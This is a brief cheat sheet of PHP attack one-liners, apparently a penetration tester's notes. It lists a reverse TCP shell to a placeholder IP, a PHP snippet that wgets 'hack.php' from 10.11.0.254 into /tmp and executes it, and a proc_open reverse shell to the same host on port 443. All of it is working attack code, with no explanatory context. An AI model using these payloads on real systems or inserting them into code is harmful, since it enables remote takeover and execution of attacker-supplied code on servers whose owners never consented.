# PHP

## Reverse TCP
php -r '$sock=fsockopen("xx.xx.xx.xx",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

## BSD download and execute php.

\<\?php shell_exec("/usr/local/bin/wget -P /tmp 10.11.0.254/hack.php; /usr/local/bin/php /tmp/hack.php");\?\>

<?php $sock = fsockopen("10.11.0.254",443); $proc = proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
